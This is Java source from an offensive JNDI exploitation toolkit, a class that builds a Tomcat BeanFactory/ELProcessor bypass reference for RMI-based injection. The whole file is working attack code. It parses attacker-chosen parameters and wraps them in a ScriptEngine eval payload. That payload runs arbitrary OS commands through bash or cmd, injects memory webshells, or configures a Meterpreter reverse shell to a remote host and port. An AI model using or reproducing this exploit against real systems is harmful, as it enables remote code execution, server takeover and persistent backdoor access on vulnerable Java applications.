package com.qi4l.JYso.controllers.rmi;

import com.qi4l.JYso.enumtypes.GadgetType;
import com.qi4l.JYso.exceptions.IncorrectParamsException;
import com.qi4l.JYso.exceptions.UnSupportedPayloadTypeException;
import com.qi4l.JYso.gadgets.Config.Config;
import com.qi4l.JYso.gadgets.utils.Gadgets;
import com.qi4l.JYso.gadgets.utils.InjShell;
import com.qi4l.JYso.gadgets.utils.Util;
import com.qi4l.JYso.gadgets.utils.handle.ClassNameHandler;
import org.apache.naming.ResourceRef;
import org.fusesource.jansi.Ansi;

import javax.naming.StringRefAddr;
import java.io.IOException;
import java.lang.reflect.Field;

public class rmiTomcatBypass {
    static String     payloadType;
    static String[]   params;
    static GadgetType gadgetType = null;

    public static ResourceRef refTomcatBypass(String base) throws Exception {
        // 切割参数
        System.out.println("- JNDI RMI Local Refenrence Links ");
        try {
            base = base.replace('\\', '/');
            int fistIndex   = base.indexOf("/");
            int secondIndex = base.indexOf("/", fistIndex + 1);
            if (secondIndex < 0) secondIndex = base.length();

            try {
                payloadType = base.substring(fistIndex + 1, secondIndex);
                System.out.println(Ansi.ansi().fgBrightMagenta().a("  PaylaodType: " + payloadType).reset());
            } catch (IllegalArgumentException e) {
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + base.substring(fistIndex + 1, secondIndex));
            }

            int thirdIndex = base.indexOf("/", secondIndex + 1);

            if (thirdIndex != -1) {
                if (thirdIndex < 0) thirdIndex = base.length();
                try {
                    gadgetType = GadgetType.valueOf(base.substring(secondIndex + 1, thirdIndex).toLowerCase());
                } catch (IllegalArgumentException e) {
                    throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + base.substring(secondIndex + 1, thirdIndex));
                }
            }

            if (gadgetType == GadgetType.base64) {
                String cmd = Util.getCmdFromBase(base);
                System.out.println(Ansi.ansi().fgBrightRed().a("  Command: " + cmd).reset());
                params = new String[]{cmd};
            }

            if (gadgetType == GadgetType.shell) {
                String   cmd1         = Util.getCmdFromBase(base);
                byte[]   decodedBytes = Util.base64Decode(cmd1);
                String   cmd          = new String(decodedBytes);
                String[] cmdArray     = cmd.split(" ");
                System.out.println(Ansi.ansi().fgBrightRed().a("  Command: " + cmd).reset());
                params = cmdArray;
            }

            if (gadgetType == GadgetType.msf) {
                String[] results1 = Util.getIPAndPortFromBase(base);
                Config.rhost = results1[0];
                Config.rport = results1[1];
                System.out.println("[+] RemotHost: " + results1[0]);
                System.out.println("[+] RemotPort: " + results1[1]);
                params = results1;
            }
        } catch (Exception e) {
            if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;

            throw new IncorrectParamsException("Incorrect params: " + base);
        }

        // 构造ref对象
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        String             code   = null;

        if (payloadType.contains("E-")) {
            String      ClassName1 = payloadType.substring(payloadType.indexOf('-') + 1);
            final Class EchoClass  = Class.forName(ClassNameHandler.searchClassByName(ClassName1));
            code = InjShell.injectClass(EchoClass);
        }

        if (payloadType.contains("M-")) {
            String ClassName1 = payloadType.substring(payloadType.indexOf('-') + 1);
            InjShell.init(params);
            code = Gadgets.createClassT(ClassName1);
        }

        if (payloadType.contains("command")) {
            code = getExecCode(params[0]);
        }

        if (payloadType.contains("meterpreter")) {
            code = injectMeterpreter();
        }


        String payloadTemplate = "{" +
                "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
                ".newInstance().getEngineByName(\"JavaScript\")" +
                ".eval(\"{replacement}\")" +
                "}";
        String finalPayload = payloadTemplate.replace("{replacement}", code);
        ref.add(new StringRefAddr("x", finalPayload));

        return ref;
    }

    public static String injectMeterpreter() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        Class<?> ctClazz      = Class.forName("com.qi4l.JYso.template.Meterpreter");
        Field    WinClassName = ctClazz.getDeclaredField("host");
        WinClassName.setAccessible(true);
        WinClassName.set(ctClazz, params[0]);
        Field WinclassBody = ctClazz.getDeclaredField("port");
        WinclassBody.setAccessible(true);
        WinclassBody.set(ctClazz, params[1]);
        return InjShell.injectClass(ctClazz);
    }

    public static String getExecCode(String cmd) throws IOException {

        String code = "var strs=new Array(3);\n" +
                "        if(java.io.File.separator.equals('/')){\n" +
                "            strs[0]='/bin/bash';\n" +
                "            strs[1]='-c';\n" +
                "            strs[2]='" + cmd + "';\n" +
                "        }else{\n" +
                "            strs[0]='cmd';\n" +
                "            strs[1]='/C';\n" +
                "            strs[2]='" + cmd + "';\n" +
                "        }\n" +
                "        java.lang.Runtime.getRuntime().exec(strs);";

        return code;
    }

}